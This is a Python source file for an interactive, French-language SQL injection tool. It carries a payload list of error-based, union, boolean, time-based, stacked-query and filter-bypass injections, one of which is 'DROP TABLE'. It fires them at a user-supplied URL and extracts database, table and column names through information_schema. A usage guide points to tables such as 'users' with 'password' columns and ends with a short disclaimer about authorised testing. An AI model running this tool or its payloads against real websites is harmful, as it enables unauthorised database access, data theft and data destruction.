import requests
import time
import random
import string
from tool.main import menu_princi

SQL_PAYLOADS = {
    "error_based": [
        "' OR 1=1 --", "\" OR 1=1 --", "' OR 'a'='a", "\" OR \"a\"=\"a",
        "' AND 1=CONVERT(int, @@version) --", "' AND 1=CONVERT(int, db_name()) --",
        "'; SELECT @@version --", "\"; SELECT @@version --"
    ],
    "union_based": [
        "' UNION SELECT null, null, null --", "\" UNION SELECT null, null, null --",
        "' UNION SELECT table_name, null, null FROM information_schema.tables --"
    ],
    "boolean_based": [
        "' AND 1=1 --", "' AND 1=0 --", "\" AND 1=1 --", "\" AND 1=0 --"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --", "\"; WAITFOR DELAY '0:0:5' --",
        "'; SELECT pg_sleep(5) --", "\"; SELECT pg_sleep(5) --"
    ],
    "stacked_queries": [
        "'; DROP TABLE test --", "\"; DROP TABLE test --"
    ],
    "bypass_filters": [
        "' OR '1'='1' /*", "\" OR \"1\"=\"1\" /*", "'--", "\"--"
    ]
}


def random_string(length=10):
    """G√©n√®re une cha√Æne al√©atoire de caract√®res."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))


def test_sql_injection(url, param, method="GET", data=None, headers=None, cookies=None):
    print(f"\n[+] Test d'injection SQL sur {url} (Param√®tre: '{param}', M√©thode: {method})\n")
    vulnerable = False


    if method == "POST" and data is None:
        data = {}


    for attack_type, payloads in SQL_PAYLOADS.items():
        print(f"\n[+] Test pour {attack_type} :")
        for payload in payloads:

            if method == "GET":
                test_url = url.replace(f"{param}=", f"{param}={payload}")
                print(f"[*] Test GET avec payload : {payload}")
                try:
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur r√©seau : {e}")
                    continue
            elif method == "POST":
                data[param] = payload
                test_url = url
                print(f"[*] Test POST avec payload : {payload}")
                try:
                    response = requests.post(test_url, data=data, headers=headers, cookies=cookies, timeout=5)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur r√©seau : {e}")
                    continue

            if 'response' in locals() and ("mysql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower()):
                print(f"[!!!] Injection SQL d√©tect√©e avec le payload : {payload} üö®")
                vulnerable = True
                break

            if attack_type == "time_based":
                start_time = time.time()
                try:
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Erreur r√©seau : {e}")
                    continue
                end_time = time.time()

                if end_time - start_time > 4:
                    print(f"[!!!] Injection SQL bas√©e sur le temps d√©tect√©e avec le payload : {payload} üö®")
                    vulnerable = True
                    break

        if vulnerable:
            break

    return vulnerable




def extract_database(url, param, headers=None, cookies=None):
    print("[+] Tentative d'extraction de la base de donn√©es...")
    payload = "' UNION SELECT database(), null, null --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] R√©ponse obtenue. Voici les donn√©es :\n")
            print(response.text)
        else:
            print("[!] √âchec de l'extraction de la base de donn√©es.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_databases(url, param, headers=None, cookies=None):
    print("[+] Extraction des bases de donn√©es disponibles...")

    payload = "' UNION SELECT schema_name, null, null FROM information_schema.schemata --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] Bases de donn√©es trouv√©es :\n")
            print(response.text)
        else:
            print("[!] √âchec de l'extraction des bases de donn√©es.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_tables(url, param, headers=None, cookies=None):
    print("[+] Extraction des tables disponibles...")

    payload = "' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema=database() --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print("[*] Tables trouv√©es :\n")
            print(response.text)
        else:
            print("[!] √âchec de l'extraction des tables.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def extract_columns(url, param, table, headers=None, cookies=None):
    print(f"[+] Extraction des colonnes de la table '{table}'...")

    payload = f"' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='{table}' --"
    test_url = url.replace(f"{param}=", f"{param}={payload}")

    try:
        response = requests.get(test_url, headers=headers, cookies=cookies, timeout=5)
        if response.status_code == 200:
            print(f"[*] Colonnes trouv√©es dans '{table}' :\n")
            print(response.text)
        else:
            print(f"[!] √âchec de l'extraction des colonnes pour la table '{table}'.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur : {e}")


def get_custom_headers_and_cookies():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    cookies = {'session': 'your_session_cookie_here'}
    return headers, cookies


def explanation_page():
    print("""
    === Guide d'Utilisation de l'Outil SQL Injection ===

    **Introduction** : 
    Cet outil est con√ßu pour tester et exploiter les vuln√©rabilit√©s d'injection SQL sur des sites web. Il vous permet de v√©rifier si une URL est vuln√©rable √† diverses techniques d'injection SQL, d'extraire des informations comme les bases de donn√©es, les tables et les colonnes, et d'identifier les failles de s√©curit√© potentielles.

    **Fonctionnalit√©s disponibles :**

    1. **Tester la vuln√©rabilit√© √† l'injection SQL :**
       - Cette fonctionnalit√© teste si un param√®tre donn√© dans une URL (comme `id`, `page`, etc.) est vuln√©rable √† l'injection SQL.
       - Des payloads sont envoy√©s sur le param√®tre (par exemple `' OR 1=1 --`) pour essayer de d√©tecter des erreurs SQL, des injections bas√©es sur le temps ou des injections de type `union`.
       - Exemple : Si l'URL est `http://example.com?id=1`, vous pouvez tester si l'ID est vuln√©rable en utilisant ce param√®tre dans les tests.

    2. **Extraire la base de donn√©es :**
       - Si un site est vuln√©rable √† l'injection SQL, cette option permet d'extraire le nom de la base de donn√©es.
       - Cette m√©thode envoie des payloads d'union SQL pour interroger la base de donn√©es cible (par exemple, `SELECT database()`).
       - Exemple : Si vous obtenez la base de donn√©es comme `example_db`, vous pouvez continuer √† explorer d'autres informations comme les tables et les colonnes.

    3. **Extraire les tables :**
       - Apr√®s avoir extrait le nom de la base de donn√©es, cette option vous permet de lister toutes les tables de cette base.
       - La requ√™te SQL utilis√©e est `SELECT table_name FROM information_schema.tables`.
       - Exemple : Vous pourriez trouver des tables comme `users`, `admin`, etc., qui contiennent des informations sensibles.

    4. **Extraire les colonnes d'une table sp√©cifique :**
       - Une fois que vous avez trouv√© une table int√©ressante, cette option permet d'extraire les noms de colonnes de cette table.
       - Exemple : Pour une table `users`, les colonnes peuvent inclure `id`, `username`, `password`, etc.

    **Utilisation √©thique** : Avant d'utiliser cet outil, assurez-vous d'avoir l'autorisation explicite du propri√©taire du site pour tester ses vuln√©rabilit√©s. Utilisez cet outil uniquement √† des fins d'apprentissage et de tests l√©gaux.

    """)


def interactive_tool_sql():
    print("\nBienvenue dans l'outil d'injection SQL interactif!\n")

    while True:
        print("\nQue voulez-vous faire ?")
        print("1. Tester l'injection SQL")
        print("2. Extraire les bases de donn√©es")
        print("3. Extraire les tables d'une base de donn√©es")
        print("4. Extraire les colonnes d'une table")
        print("5. Voir l'explication")
        print("6. Quitter")

        choice = input("\nEntrez votre choix (1-6): ").strip()

        if choice == '1':
            url = input("Entrez l'URL (avec le param√®tre) : ")
            param = input("Entrez le param√®tre √† tester (par exemple 'id') : ")
            method = input("M√©thode (GET ou POST) : ").strip().upper()
            if method not in ['GET', 'POST']:
                print("[!] M√©thode invalide. Choisissez GET ou POST.")
                continue
            headers, cookies = get_custom_headers_and_cookies()
            vulnerable = test_sql_injection(url, param, method, headers=headers, cookies=cookies)
            if vulnerable:
                print("[+] Le site est vuln√©rable √† l'injection SQL !")
            else:
                print("[+] Aucune vuln√©rabilit√© SQL d√©tect√©e.")

        elif choice == '2':
            url = input("Entrez l'URL : ")
            param = input("Entrez le param√®tre (par exemple 'id') : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_databases(url, param, headers, cookies)

        elif choice == '3':
            url = input("Entrez l'URL : ")
            param = input("Entrez le param√®tre (par exemple 'id') : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_tables(url, param, headers, cookies)

        elif choice == '4':
            url = input("Entrez l'URL : ")
            param = input("Entrez le param√®tre (par exemple 'id') : ")
            table = input("Entrez le nom de la table : ")
            headers, cookies = get_custom_headers_and_cookies()
            extract_columns(url, param, table, headers, cookies)

        elif choice == '5':
            explanation_page()

        elif choice == '6':
            print("Merci d'avoir utilis√© l'outil SQL Injection. √Ä bient√¥t!")
            menu_princi()

        else:
            print("[!] Choix invalide. Essayez encore.")
